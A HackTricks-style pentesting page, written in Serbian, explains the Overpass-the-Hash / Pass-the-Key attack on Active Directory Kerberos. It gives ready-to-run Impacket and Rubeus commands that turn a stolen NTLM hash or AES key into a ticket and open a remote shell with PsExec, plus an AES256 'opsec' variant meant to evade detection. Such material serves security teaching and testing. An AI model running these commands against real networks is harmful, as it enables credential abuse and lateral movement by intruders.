# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Overpass The Hash/Pass The Key (PTK)

Napad **Overpass The Hash/Pass The Key (PTK)** je dizajniran za okruženja gde je tradicionalni NTLM protokol ograničen, a Kerberos autentifikacija ima prioritet. Ovaj napad koristi NTLM hash ili AES ključeve korisnika da bi zatražio Kerberos karte, omogućavajući neovlašćen pristup resursima unutar mreže.

Da bi se izvršio ovaj napad, prvi korak uključuje sticanje NTLM hasha ili lozinke ciljanog korisničkog naloga. Nakon obezbeđivanja ovih informacija, može se dobiti Ticket Granting Ticket (TGT) za nalog, što omogućava napadaču pristup uslugama ili mašinama kojima korisnik ima dozvole.

Proces se može pokrenuti sledećim komandama:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Za scenarije koji zahtevaju AES256, opcija `-aesKey [AES key]` može biti korišćena. Pored toga, dobijena karta može se koristiti sa raznim alatima, uključujući smbexec.py ili wmiexec.py, proširujući opseg napada.

Problemi kao što su _PyAsn1Error_ ili _KDC cannot find the name_ obično se rešavaju ažuriranjem Impacket biblioteke ili korišćenjem imena hosta umesto IP adrese, osiguravajući kompatibilnost sa Kerberos KDC.

Alternativna komanda koristeći Rubeus.exe demonstrira još jedan aspekt ove tehnike:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ova metoda odražava pristup **Pass the Key**, sa fokusom na preuzimanje i korišćenje karte direktno u svrhe autentifikacije. Važno je napomenuti da pokretanje TGT zahteva pokreće događaj `4768: A Kerberos authentication ticket (TGT) was requested`, što označava korišćenje RC4-HMAC po defaultu, iako moderni Windows sistemi preferiraju AES256.

Da bi se pridržavali operativne sigurnosti i koristili AES256, može se primeniti sledeća komanda:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Reference

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
